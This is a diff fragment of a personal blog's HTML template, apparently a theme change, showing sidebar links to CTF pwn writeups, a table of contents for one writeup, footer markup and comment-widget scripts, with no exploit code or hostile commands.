writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/d25cfe689094.html" title="【Pwn#0x05】pwnable.tw hacknote writeup">【Pwn#0x05】pwnable.tw hacknote writeup</a><time datetime="2022-09-01T07:04:01.000Z" title="Created 2022-09-01 15:04:01">2022-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/6825f1bc6742.html" title="【Pwn#0x06】pwnable.tw applestore writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x06】pwnable.tw applestore writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/6825f1bc6742.html" title="【Pwn#0x06】pwnable.tw applestore writeup">【Pwn#0x06】pwnable.tw applestore writeup</a><time datetime="2022-09-08T00:41:53.000Z" title="Created 2022-09-08 08:41:53">2022-09-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/508d7fe62c17.html" title="【Pwn#0x07】THUCTF 2022 babystack_level3"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x07】THUCTF 2022 babystack_level3"></a><div class="content"><a class="title" href="/Tech/Pwn/508d7fe62c17.html" title="【Pwn#0x07】THUCTF 2022 babystack_level3">【Pwn#0x07】THUCTF 2022 babystack_level3</a><time datetime="2022-11-15T06:11:48.000Z" title="Created 2022-11-15 14:11:48">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/315b637e69b6.html" title="【Pwn#0x08】0CTF 2017 babyheap"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x08】0CTF 2017 babyheap"></a><div class="content"><a class="title" href="/Tech/Pwn/315b637e69b6.html" title="【Pwn#0x08】0CTF 2017 babyheap">【Pwn#0x08】0CTF 2017 babyheap</a><time datetime="2023-01-11T02:06:09.000Z" title="Created 2023-01-11 10:06:09">2023-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/c372e83f29fd.html" title="【Pwn#0x09】ZCTF 2016 note2"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x09】ZCTF 2016 note2"></a><div class="content"><a class="title" href="/Tech/Pwn/c372e83f29fd.html" title="【Pwn#0x09】ZCTF 2016 note2">【Pwn#0x09】ZCTF 2016 note2</a><time datetime="2023-01-16T07:59:08.000Z" title="Created 2023-01-16 15:59:08">2023-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/7e0b30214381.html" title="【Pwn#0x0A】pwnable.tw tcache_tear writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x0A】pwnable.tw tcache_tear writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/7e0b30214381.html" title="【Pwn#0x0A】pwnable.tw tcache_tear writeup">【Pwn#0x0A】pwnable.tw tcache_tear writeup</a><time datetime="2023-02-01T07:16:30.000Z" title="Created 2023-02-01 15:16:30">2023-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/80789099dd23.html" title="【Pwn#0x0B】NJCTF 2017 messager"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x0B】NJCTF 2017 messager"></a><div class="content"><a class="title" href="/Tech/Pwn/80789099dd23.html" title="【Pwn#0x0B】NJCTF 2017 messager">【Pwn#0x0B】NJCTF 2017 messager</a><time datetime="2023-03-07T14:24:20.000Z" title="Created 2023-03-07 22:24:20">2023-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/33ac9256da88.html" title="【Pwn#0x0C】*CTF 2018 babystack"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x0C】*CTF 2018 babystack"></a><div class="content"><a class="title" href="/Tech/Pwn/33ac9256da88.html" title="【Pwn#0x0C】*CTF 2018 babystack">【Pwn#0x0C】*CTF 2018 babystack</a><time datetime="2023-03-08T02:25:50.000Z" title="Created 2023-03-08 10:25:50">2023-03-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/b40f5afe3eeb.html" title="【Pwn#0x0D】HackIM CTF 2023 spygame writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x0D】HackIM CTF 2023 spygame writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/b40f5afe3eeb.html" title="【Pwn#0x0D】HackIM CTF 2023 spygame writeup">【Pwn#0x0D】HackIM CTF 2023 spygame writeup</a><time datetime="2023-03-10T11:59:14.000Z" title="Created 2023-03-10 19:59:14">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/a45521a4b6a2.html" title="【Pwn#0x0E】UTCTF 2023 Printfail writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x0E】UTCTF 2023 Printfail writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/a45521a4b6a2.html" title="【Pwn#0x0E】UTCTF 2023 Printfail writeup">【Pwn#0x0E】UTCTF 2023 Printfail writeup</a><time datetime="2023-03-12T13:28:13.000Z" title="Created 2023-03-12 21:28:13">2023-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/141743759f16.html" title="【Pwn#0x0F】UTCTF 2023 Bing Chilling"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x0F】UTCTF 2023 Bing Chilling"></a><div class="content"><a class="title" href="/Tech/Pwn/141743759f16.html" title="【Pwn#0x0F】UTCTF 2023 Bing Chilling">【Pwn#0x0F】UTCTF 2023 Bing Chilling</a><time datetime="2023-04-04T05:19:34.000Z" title="Created 2023-04-04 13:19:34">2023-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/f6c454d44380.html" title="【Pwn#0x10】pwnable.tw Re-alloc writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x10】pwnable.tw Re-alloc writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/f6c454d44380.html" title="【Pwn#0x10】pwnable.tw Re-alloc writeup">【Pwn#0x10】pwnable.tw Re-alloc writeup</a><time datetime="2023-04-13T15:03:41.000Z" title="Created 2023-04-13 23:03:41">2023-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/9b71e71b216d.html" title="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain"></a><div class="content"><a class="title" href="/Tech/Pwn/9b71e71b216d.html" title="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain">【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain</a><time datetime="2023-05-03T23:55:01.000Z" title="Created 2023-05-04 07:55:01">2023-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/b0d805e48d9f.html" title="【Pwn#0x12】pwnable.tw seethefile writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x12】pwnable.tw seethefile writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/b0d805e48d9f.html" title="【Pwn#0x12】pwnable.tw seethefile writeup">【Pwn#0x12】pwnable.tw seethefile writeup</a><time datetime="2023-05-07T04:44:10.000Z" title="Created 2023-05-07 12:44:10">2023-05-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/224d2c00b9a1.html" title="【Pwn#0x13】pwnable.tw Starbound writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x13】pwnable.tw Starbound writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/224d2c00b9a1.html" title="【Pwn#0x13】pwnable.tw Starbound writeup">【Pwn#0x13】pwnable.tw Starbound writeup</a><time datetime="2023-10-13T06:59:14.000Z" title="Created 2023-10-13 14:59:14">2023-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/9f086a2e9319.html" title="【Pwn#0x14】pwnable.tw BabyStack writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x14】pwnable.tw BabyStack writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/9f086a2e9319.html" title="【Pwn#0x14】pwnable.tw BabyStack writeup">【Pwn#0x14】pwnable.tw BabyStack writeup</a><time datetime="2023-10-23T11:51:17.000Z" title="Created 2023-10-23 19:51:17">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/2a2c8d32f543.html" title="【Pwn#0x15】HITCTF2023 xv6-Trusted writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn#0x15】HITCTF2023 xv6-Trusted writeup"></a><div class="content"><a class="title" href="/Tech/Pwn/2a2c8d32f543.html" title="【Pwn#0x15】HITCTF2023 xv6-Trusted writeup">【Pwn#0x15】HITCTF2023 xv6-Trusted writeup</a><time datetime="2023-11-28T17:58:33.000Z" title="Created 2023-11-29 01:58:33">2023-11-29</time></div></div></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Tech/PWN/576345e2f0f6.html" title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup"/></a><div class="content"><a class="title" href="/Tech/PWN/576345e2f0f6.html" title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup">【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup</a><time datetime="2024-04-18T05:22:03.000Z" title="Created 2024-04-18 13:22:03">2024-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Daily/df1454eccbba.html" title="博客更新计划"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客更新计划"/></a><div class="content"><a class="title" href="/Daily/df1454eccbba.html" title="博客更新计划">博客更新计划</a><time datetime="2024-04-17T07:05:32.000Z" title="Created 2024-04-17 15:05:32">2024-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Music/20db37a1b726.html" title="【Music】私のBAND"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Music】私のBAND"/></a><div class="content"><a class="title" href="/Music/20db37a1b726.html" title="【Music】私のBAND">【Music】私のBAND</a><time datetime="2024-03-15T13:52:47.000Z" title="Created 2024-03-15 21:52:47">2024-03-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://i.imgtg.com/2023/04/11/8zHiD.png')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Cameudis</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Exp10re the W0r1d!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
-  const initValine = () => {
-    const valine = new Valine(Object.assign({
-      el: '#vcomment',
-      appId: 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
-      appKey: '6VqGye1352LX381YQDTOaiXs',
-      avatar: 'retro',
-      serverURLs: '',
-      emojiMaps: "",
-      path: window.location.pathname,
-      visitor: true
-    }, [{"placeholder":"El Psy Congroo"}]))
-  }
 
-  const loadValine = async () => {
-    if (typeof Valine === 'function') initValine()
-    else {
-      await getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
-      initValine()
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Tech/Pwn/9b71e71b216d.html" rel="prev" title="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain">
+      <i class="fa fa-chevron-left"></i> 【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Tech/Network/b81b909d9b2a.html" rel="next" title="【Network#0x01】RDT协议实现（GBN和SR）">
+      【Network#0x01】RDT协议实现（GBN和SR） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
     }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
+</script>
 
-  if ('Valine' === 'Valine' || !false) {
-    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
-    else setTimeout(loadValine, 0)
-  } else {
-    window.loadOtherComment = loadValine
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FILE-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">FILE 结构体分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fclose-%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">fclose 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0"><span class="nav-number">4.1.</span> <span class="nav-text">结构体伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP%E8%84%9A%E6%9C%AC"><span class="nav-number">4.2.</span> <span class="nav-text">EXP脚本</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cameudis"
+      src="/images/ava1.jpg">
+  <p class="site-author-name" itemprop="name">Cameudis</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-dove"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cameudis</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
   }
-})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
+      appKey     : '6VqGye1352LX381YQDTOaiXs',
+      placeholder: "El Psy Congroo",
+      avatar     : 'retro',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+</body>
+</html>
